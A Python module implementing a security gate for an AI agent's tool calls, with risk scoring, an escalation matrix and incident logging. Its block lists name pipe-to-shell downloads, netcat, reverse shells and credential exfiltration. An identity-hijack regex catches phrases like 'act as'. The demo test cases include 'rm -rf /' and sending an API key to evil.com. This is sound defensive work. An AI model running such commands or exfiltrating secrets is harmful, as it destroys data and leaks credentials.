"""
Threat Gate - Security Layer for Agentic Loop

Intercepts tool calls between decision and execution to:
- Match against known threat signatures
- Verify source trust levels
- Assess action risk
- Apply escalation matrix
- Log all decisions

Integration: Insert between tool call decision and execution in agentic loop.

Example:
    gate = ThreatGate(memory_root)

    decision = gate.evaluate(
        tool_name="write_file",
        parameters={"path": "/etc/passwd", "content": "..."},
        source_identifier="user@example.com",
        context={"session_id": "..."}
    )

    if decision.action == "execute":
        # Proceed with tool execution
        result = execute_tool(tool_name, parameters)
    elif decision.action == "confirm":
        # Request user confirmation
        if user_confirms():
            result = execute_tool(tool_name, parameters)
    elif decision.action == "decline":
        # Block execution
        log_declined_action(decision)
    elif decision.action == "alert":
        # Block and alert guardian
        notify_guardian(decision)
"""

import json
import re
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from .trust import TrustLedger
from .threats import ThreatSignatures
from .episodic import EpisodicStore


class RiskLevel(Enum):
    """Risk level classification for actions."""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


class GateAction(Enum):
    """Possible gate decisions."""
    EXECUTE = "execute"           # Proceed immediately
    EXECUTE_LOG = "execute_log"   # Proceed with logging
    CONFIRM = "confirm"           # Request confirmation
    DECLINE = "decline"           # Block silently
    DECLINE_ALERT = "decline_alert"  # Block and alert
    GUARDIAN_REQUIRED = "guardian_required"  # Require guardian approval
    FULL_STOP = "full_stop"       # Block everything, alert all


@dataclass
class ThreatMatch:
    """A matched threat signature."""
    signature_id: str
    severity: str
    pattern: str
    description: str
    confidence: float
    matched_content: str


@dataclass
class RiskAssessment:
    """Risk assessment for an action."""
    risk_level: RiskLevel
    risk_score: float  # 0.0 to 1.0
    categories: List[str]  # file_modification, network_access, credential_use, etc.
    reversible: bool
    reasons: List[str]


@dataclass
class GateDecision:
    """Decision from the Threat Gate."""
    action: GateAction
    tool_name: str
    source_identifier: str
    trust_level: float
    risk_assessment: RiskAssessment
    threat_matches: List[ThreatMatch]
    timestamp: str
    reason: str
    requires_guardian: bool = False
    incident_id: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "action": self.action.value,
            "tool_name": self.tool_name,
            "source_identifier": self.source_identifier,
            "trust_level": self.trust_level,
            "risk_level": self.risk_assessment.risk_level.value,
            "risk_score": self.risk_assessment.risk_score,
            "threat_matches": [
                {"id": m.signature_id, "severity": m.severity, "confidence": m.confidence}
                for m in self.threat_matches
            ],
            "timestamp": self.timestamp,
            "reason": self.reason,
            "requires_guardian": self.requires_guardian,
            "incident_id": self.incident_id,
        }


class ThreatGate:
    """
    Security gate for the agentic loop.

    Evaluates tool calls against:
    - Known threat signatures
    - Source trust levels
    - Action risk assessment
    - Behavioral patterns

    Returns decisions based on escalation matrix.
    """

    # Risk categories and their base risk scores
    RISK_CATEGORIES = {
        "file_modification": 0.4,
        "file_deletion": 0.7,
        "network_access": 0.5,
        "credential_use": 0.8,
        "credential_read": 0.9,
        "system_command": 0.6,
        "code_execution": 0.5,
        "data_exfiltration": 0.9,
        "configuration_change": 0.6,
        "privilege_escalation": 0.95,
    }

    # High-risk file patterns
    HIGH_RISK_PATHS = [
        r"/etc/passwd",
        r"/etc/shadow",
        r"\.env$",
        r"\.ssh/",
        r"id_rsa",
        r"credentials",
        r"secrets?\.ya?ml",
        r"\.aws/",
        r"\.kube/config",
        r"api[_-]?keys?",
    ]

    # Dangerous command patterns
    DANGEROUS_COMMANDS = [
        r"\brm\s+(-rf?|--force)",
        r"\bsudo\b",
        r"\bchmod\s+777",
        r"\bcurl\b.*\|\s*(ba)?sh",
        r"\bwget\b.*\|\s*(ba)?sh",
        r"\beval\b",
        r"\bexec\b",
        r"\b(nc|netcat)\b",
        r"\breverse.?shell",
    ]

    # Credential exfiltration patterns
    EXFIL_PATTERNS = [
        r"(curl|wget|nc).*\b(api[_-]?key|password|secret|token)",
        r"echo.*\$\{?[A-Z_]*(KEY|TOKEN|SECRET|PASSWORD)",
        r"cat.*(\.env|credentials|secrets)",
        r"base64.*\|.*(curl|wget|nc)",
    ]

    def __init__(
        self,
        memory_root: Optional[Path] = None,
        trust_ledger: Optional[TrustLedger] = None,
        threat_signatures: Optional[ThreatSignatures] = None,
        episodic_store: Optional[EpisodicStore] = None,
    ):
        """
        Initialize the Threat Gate.

        Args:
            memory_root: Root path for memory stores
            trust_ledger: Existing TrustLedger instance
            threat_signatures: Existing ThreatSignatures instance
            episodic_store: Existing EpisodicStore for logging
        """
        if memory_root is None:
            from .init_store import get_memory_root
            memory_root = get_memory_root()

        self.memory_root = Path(memory_root)
        self.trust = trust_ledger or TrustLedger(memory_root)
        self.threats = threat_signatures or ThreatSignatures(memory_root)
        self.episodic = episodic_store or EpisodicStore(memory_root)

        # Incidents directory
        self.incidents_dir = self.memory_root / "threats" / "incidents"
        self.incidents_dir.mkdir(parents=True, exist_ok=True)

        # Compile patterns
        self._high_risk_paths = [re.compile(p, re.IGNORECASE) for p in self.HIGH_RISK_PATHS]
        self._dangerous_commands = [re.compile(p, re.IGNORECASE) for p in self.DANGEROUS_COMMANDS]
        self._exfil_patterns = [re.compile(p, re.IGNORECASE) for p in self.EXFIL_PATTERNS]

    def evaluate(
        self,
        tool_name: str,
        parameters: Dict[str, Any],
        source_identifier: str,
        context: Optional[Dict[str, Any]] = None,
    ) -> GateDecision:
        """
        Evaluate a tool call and return a decision.

        Args:
            tool_name: Name of the tool being called
            parameters: Tool parameters
            source_identifier: Who is requesting this action
            context: Additional context (session_id, etc.)

        Returns:
            GateDecision with action and reasoning
        """
        context = context or {}
        timestamp = datetime.utcnow().isoformat() + "Z"

        # 1. Get source trust level
        entity = self.trust.get_entity(source_identifier)
        trust_level = entity.trust_level if entity else 0.3

        # 2. Assess risk of the action
        risk = self._assess_risk(tool_name, parameters)

        # 3. Check for threat signature matches
        threat_matches = self._check_threat_signatures(tool_name, parameters)

        # 4. Check behavioral anomaly
        if entity:
            is_anomaly, anomaly_score = self.trust.check_anomaly(
                source_identifier,
                f"tool:{tool_name}"
            )
        else:
            is_anomaly, anomaly_score = True, 0.8

        # 5. Apply escalation matrix
        action, reason = self._apply_escalation_matrix(
            trust_level=trust_level,
            risk=risk,
            threat_matches=threat_matches,
            is_anomaly=is_anomaly,
            anomaly_score=anomaly_score,
        )

        # 6. Create decision
        decision = GateDecision(
            action=action,
            tool_name=tool_name,
            source_identifier=source_identifier,
            trust_level=trust_level,
            risk_assessment=risk,
            threat_matches=threat_matches,
            timestamp=timestamp,
            reason=reason,
            requires_guardian=action in [GateAction.GUARDIAN_REQUIRED, GateAction.FULL_STOP],
        )

        # 7. Log the decision
        self._log_decision(decision, parameters, context)

        # 8. Create incident if needed
        if action in [GateAction.DECLINE, GateAction.DECLINE_ALERT,
                      GateAction.GUARDIAN_REQUIRED, GateAction.FULL_STOP]:
            decision.incident_id = self._create_incident(decision, parameters)

        return decision

    def _assess_risk(self, tool_name: str, parameters: Dict[str, Any]) -> RiskAssessment:
        """Assess the risk level of an action."""
        categories = []
        reasons = []
        risk_scores = []
        reversible = True

        # Analyze tool type
        tool_lower = tool_name.lower()

        if any(w in tool_lower for w in ["write", "create", "modify", "edit"]):
            categories.append("file_modification")
            risk_scores.append(self.RISK_CATEGORIES["file_modification"])
            reasons.append("File modification requested")

        if any(w in tool_lower for w in ["delete", "remove", "rm"]):
            categories.append("file_deletion")
            risk_scores.append(self.RISK_CATEGORIES["file_deletion"])
            reasons.append("File deletion requested")
            reversible = False

        if any(w in tool_lower for w in ["fetch", "request", "http", "curl", "wget"]):
            categories.append("network_access")
            risk_scores.append(self.RISK_CATEGORIES["network_access"])
            reasons.append("Network access requested")

        if any(w in tool_lower for w in ["exec", "run", "shell", "bash", "command"]):
            categories.append("system_command")
            risk_scores.append(self.RISK_CATEGORIES["system_command"])
            reasons.append("System command execution")

        # Analyze parameters
        params_str = json.dumps(parameters).lower()

        # Check for high-risk paths
        for pattern in self._high_risk_paths:
            if pattern.search(params_str):
                categories.append("credential_read")
                risk_scores.append(self.RISK_CATEGORIES["credential_read"])
                reasons.append(f"Access to sensitive path: {pattern.pattern}")
                break

        # Check for dangerous commands
        for pattern in self._dangerous_commands:
            if pattern.search(params_str):
                categories.append("privilege_escalation")
                risk_scores.append(self.RISK_CATEGORIES["privilege_escalation"])
                reasons.append(f"Dangerous command pattern: {pattern.pattern}")
                reversible = False
                break

        # Check for exfiltration patterns
        for pattern in self._exfil_patterns:
            if pattern.search(params_str):
                categories.append("data_exfiltration")
                risk_scores.append(self.RISK_CATEGORIES["data_exfiltration"])
                reasons.append(f"Possible data exfiltration: {pattern.pattern}")
                break

        # Calculate overall risk score
        if not risk_scores:
            overall_score = 0.1
        else:
            overall_score = max(risk_scores)  # Use highest risk

        # Determine risk level
        if overall_score >= 0.9:
            risk_level = RiskLevel.CRITICAL
        elif overall_score >= 0.7:
            risk_level = RiskLevel.HIGH
        elif overall_score >= 0.4:
            risk_level = RiskLevel.MEDIUM
        else:
            risk_level = RiskLevel.LOW

        return RiskAssessment(
            risk_level=risk_level,
            risk_score=overall_score,
            categories=categories or ["general"],
            reversible=reversible,
            reasons=reasons or ["No specific risk factors identified"],
        )

    def _check_threat_signatures(
        self,
        tool_name: str,
        parameters: Dict[str, Any]
    ) -> List[ThreatMatch]:
        """Check for matches against known threat signatures."""
        matches = []

        # Get content to check
        content = f"{tool_name} {json.dumps(parameters)}"

        # Load active threats
        try:
            active_threats = self.threats.get_active_threats()
        except Exception:
            active_threats = []

        # Check each signature
        for threat in active_threats:
            indicators = threat.get("indicators", [])
            trigger_phrases = threat.get("trigger_phrases", [])
            pattern = threat.get("pattern", "")

            matched = False
            matched_content = ""

            # Check pattern
            if pattern:
                try:
                    if re.search(pattern, content, re.IGNORECASE):
                        matched = True
                        matched_content = pattern
                except re.error:
                    pass

            # Check indicators
            for indicator in indicators:
                if indicator.lower() in content.lower():
                    matched = True
                    matched_content = indicator
                    break

            # Check trigger phrases
            for phrase in trigger_phrases:
                if phrase.lower() in content.lower():
                    matched = True
                    matched_content = phrase
                    break

            if matched:
                matches.append(ThreatMatch(
                    signature_id=threat.get("id", "unknown"),
                    severity=threat.get("severity", "medium"),
                    pattern=pattern,
                    description=threat.get("description", ""),
                    confidence=0.8,
                    matched_content=matched_content,
                ))

        # Built-in threat detection
        params_str = json.dumps(parameters)

        # Identity hijacking
        if re.search(r"(impersonat|pretend|act\s+as|i\s+am\s+(your\s+)?guardian)",
                     params_str, re.IGNORECASE):
            matches.append(ThreatMatch(
                signature_id="BUILTIN_IDENTITY_HIJACK",
                severity="critical",
                pattern="identity hijacking",
                description="Attempt to impersonate trusted identity",
                confidence=0.9,
                matched_content="identity claim",
            ))

        # Credential exfiltration
        for pattern in self._exfil_patterns:
            if pattern.search(params_str):
                matches.append(ThreatMatch(
                    signature_id="BUILTIN_CREDENTIAL_EXFIL",
                    severity="critical",
                    pattern=pattern.pattern,
                    description="Possible credential exfiltration attempt",
                    confidence=0.85,
                    matched_content=pattern.pattern,
                ))
                break

        # Injection attacks
        if re.search(r";\s*(rm|curl|wget|nc|bash|sh)\b", params_str, re.IGNORECASE):
            matches.append(ThreatMatch(
                signature_id="BUILTIN_INJECTION",
                severity="high",
                pattern="command injection",
                description="Command injection attempt detected",
                confidence=0.8,
                matched_content="injection pattern",
            ))

        return matches

    def _apply_escalation_matrix(
        self,
        trust_level: float,
        risk: RiskAssessment,
        threat_matches: List[ThreatMatch],
        is_anomaly: bool,
        anomaly_score: float,
    ) -> Tuple[GateAction, str]:
        """
        Apply the escalation matrix to determine action.

        Matrix:
        - Low risk + High trust → Execute
        - Low risk + Medium trust → Execute + Log
        - Low risk + Low trust → Decline
        - Medium risk + High trust → Execute + Log
        - Medium risk + Medium trust → Request confirmation
        - Medium risk + Low trust → Decline + Alert
        - High risk + Any trust → Guardian approval required
        - Critical risk + Any → Full stop + Alert all
        - Any threat match → Escalate based on severity
        """
        # Critical threat matches override everything
        critical_threats = [m for m in threat_matches if m.severity == "critical"]
        if critical_threats:
            return GateAction.FULL_STOP, f"Critical threat detected: {critical_threats[0].description}"

        high_threats = [m for m in threat_matches if m.severity == "high"]
        if high_threats:
            return GateAction.GUARDIAN_REQUIRED, f"High-severity threat: {high_threats[0].description}"

        # Check risk level
        if risk.risk_level == RiskLevel.CRITICAL:
            return GateAction.FULL_STOP, f"Critical risk action: {', '.join(risk.reasons)}"

        if risk.risk_level == RiskLevel.HIGH:
            return GateAction.GUARDIAN_REQUIRED, f"High risk action requires guardian: {', '.join(risk.reasons)}"

        # Classify trust level
        if trust_level >= 0.8:
            trust_class = "high"
        elif trust_level >= 0.5:
            trust_class = "medium"
        else:
            trust_class = "low"

        # Apply matrix for medium risk
        if risk.risk_level == RiskLevel.MEDIUM:
            if trust_class == "high":
                return GateAction.EXECUTE_LOG, "Medium risk, high trust - logging"
            elif trust_class == "medium":
                return GateAction.CONFIRM, "Medium risk, medium trust - confirmation required"
            else:
                return GateAction.DECLINE_ALERT, "Medium risk from low-trust source"

        # Apply matrix for low risk
        if risk.risk_level == RiskLevel.LOW:
            if trust_class == "high":
                return GateAction.EXECUTE, "Low risk, high trust - fast path"
            elif trust_class == "medium":
                return GateAction.EXECUTE_LOG, "Low risk, medium trust - logging"
            else:
                return GateAction.DECLINE, "Low trust source - action declined"

        # Fallback
        return GateAction.EXECUTE_LOG, "Default: execute with logging"

    def _log_decision(
        self,
        decision: GateDecision,
        parameters: Dict[str, Any],
        context: Dict[str, Any],
    ) -> None:
        """Log the gate decision to episodic store."""
        try:
            session_id = context.get("session_id", "threat_gate")

            self.episodic.append(
                content=f"Threat Gate: {decision.tool_name} -> {decision.action.value}",
                source={
                    "identifier": "threat_gate",
                    "trust_level": 1.0,
                    "verified": True,
                },
                response_summary=decision.reason,
                session_id=session_id,
                flags=["threat_gate_decision"] + (
                    ["threat_match"] if decision.threat_matches else []
                ) + (
                    ["declined"] if decision.action in [
                        GateAction.DECLINE, GateAction.DECLINE_ALERT,
                        GateAction.GUARDIAN_REQUIRED, GateAction.FULL_STOP
                    ] else []
                ),
            )
        except Exception:
            pass  # Don't fail on logging errors

    def _create_incident(
        self,
        decision: GateDecision,
        parameters: Dict[str, Any]
    ) -> str:
        """Create an incident record for declined/escalated actions."""
        incident_id = f"INC-{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"

        incident = {
            "id": incident_id,
            "timestamp": decision.timestamp,
            "tool_name": decision.tool_name,
            "source": decision.source_identifier,
            "trust_level": decision.trust_level,
            "action_taken": decision.action.value,
            "reason": decision.reason,
            "risk_level": decision.risk_assessment.risk_level.value,
            "risk_score": decision.risk_assessment.risk_score,
            "risk_categories": decision.risk_assessment.categories,
            "threat_matches": [
                {
                    "id": m.signature_id,
                    "severity": m.severity,
                    "description": m.description,
                    "confidence": m.confidence,
                }
                for m in decision.threat_matches
            ],
            "parameters_hash": hash(json.dumps(parameters, sort_keys=True)),
            "requires_guardian_review": decision.requires_guardian,
        }

        # Save incident
        incident_file = self.incidents_dir / f"{incident_id}.json"
        incident_file.write_text(json.dumps(incident, indent=2), encoding="utf-8")

        return incident_id

    def get_incident(self, incident_id: str) -> Optional[Dict[str, Any]]:
        """Retrieve an incident by ID."""
        incident_file = self.incidents_dir / f"{incident_id}.json"
        if incident_file.exists():
            return json.loads(incident_file.read_text(encoding="utf-8"))
        return None

    def list_incidents(
        self,
        since: Optional[datetime] = None,
        severity: Optional[str] = None,
        requires_review: bool = False,
    ) -> List[Dict[str, Any]]:
        """List incidents matching criteria."""
        incidents = []

        for filepath in self.incidents_dir.glob("*.json"):
            try:
                incident = json.loads(filepath.read_text(encoding="utf-8"))

                # Filter by time
                if since:
                    incident_time = datetime.fromisoformat(
                        incident["timestamp"].replace("Z", "+00:00")
                    )
                    if incident_time < since.replace(tzinfo=incident_time.tzinfo):
                        continue

                # Filter by severity
                if severity and incident.get("risk_level") != severity:
                    continue

                # Filter by review status
                if requires_review and not incident.get("requires_guardian_review"):
                    continue

                incidents.append(incident)
            except Exception:
                continue

        # Sort by timestamp descending
        incidents.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
        return incidents

    def fast_path_check(
        self,
        tool_name: str,
        source_identifier: str,
    ) -> bool:
        """
        Quick check for fast-path execution.

        Returns True if the action can proceed without full evaluation.
        Use this for performance optimization on trusted, low-risk operations.
        """
        entity = self.trust.get_entity(source_identifier)
        if entity is None:
            return False

        # Fast path requires:
        # 1. High trust (>= 0.8)
        # 2. Not a high-risk tool
        # 3. No anomaly

        if entity.trust_level < 0.8:
            return False

        high_risk_tools = ["delete", "remove", "rm", "sudo", "exec", "shell"]
        if any(t in tool_name.lower() for t in high_risk_tools):
            return False

        is_anomaly, _ = self.trust.check_anomaly(source_identifier, f"tool:{tool_name}")
        if is_anomaly:
            return False

        return True


def evaluate_tool_call(
    tool_name: str,
    parameters: Dict[str, Any],
    source_identifier: str,
    memory_root: Optional[Path] = None,
) -> GateDecision:
    """
    Convenience function to evaluate a tool call.

    Args:
        tool_name: Name of the tool
        parameters: Tool parameters
        source_identifier: Who is requesting
        memory_root: Memory root path

    Returns:
        GateDecision
    """
    gate = ThreatGate(memory_root=memory_root)
    return gate.evaluate(tool_name, parameters, source_identifier)


if __name__ == "__main__":
    import sys

    print("Threat Gate Demo")
    print("=" * 50)

    gate = ThreatGate()

    # Test cases
    test_cases = [
        ("write_file", {"path": "readme.txt", "content": "hello"}, "trusted@example.com"),
        ("bash", {"command": "rm -rf /"}, "unknown@suspicious.com"),
        ("read_file", {"path": ".env"}, "user@example.com"),
        ("http_request", {"url": "https://evil.com", "data": "${API_KEY}"}, "attacker@bad.com"),
    ]

    for tool, params, source in test_cases:
        print(f"\nTool: {tool}")
        print(f"Params: {params}")
        print(f"Source: {source}")

        decision = gate.evaluate(tool, params, source)

        print(f"Action: {decision.action.value}")
        print(f"Risk: {decision.risk_assessment.risk_level.value} ({decision.risk_assessment.risk_score:.2f})")
        print(f"Reason: {decision.reason}")
        if decision.threat_matches:
            print(f"Threats: {[m.signature_id for m in decision.threat_matches]}")
